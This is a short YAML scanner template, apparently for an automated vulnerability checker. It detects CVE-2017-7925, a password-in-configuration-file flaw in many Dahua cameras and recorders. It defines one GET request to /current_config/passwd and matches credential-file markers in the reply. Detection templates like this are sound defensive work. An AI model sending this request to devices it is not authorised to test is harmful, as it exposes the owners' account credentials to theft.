id: CVE-2017-7925

info:
  name: Dahua Security - Configuration File Disclosure
  author: E1A,none
  severity: critical
  verified: true
  description: |-
    A Password in Configuration File issue was discovered in Dahua DH-IPC-HDBW23A0RN-ZS, DH-IPC-HDBW13A0SN, DH-IPC-HDW1XXX, DH-IPC-HDW2XXX, DH-IPC-HDW4XXX, DH-IPC-HFW1XXX, DH-IPC-HFW2XXX, DH-IPC-HFW4XXX, DH-SD6CXX, DH-NVR1XXX, DH-HCVR4XXX, DH-HCVR5XXX, DHI-HCVR51A04HE-S3, DHI-HCVR51A08HE-S3, and DHI-HCVR58A32S-S2 devices. The password in configuration file vulnerability was identified, which could lead to a malicious user assuming the identity of a privileged user and gaining access to sensitive information.
  tags: cve,cve2017,dahua,discosure
  created: 2024/11/19

rules:
  r0:
    request:
      method: GET
      path: /current_config/passwd
    expression: response.status == 200 && response.body.ibcontains(b"ugm") && response.body.bcontains(b"id:name:passwd")
expression: r0()
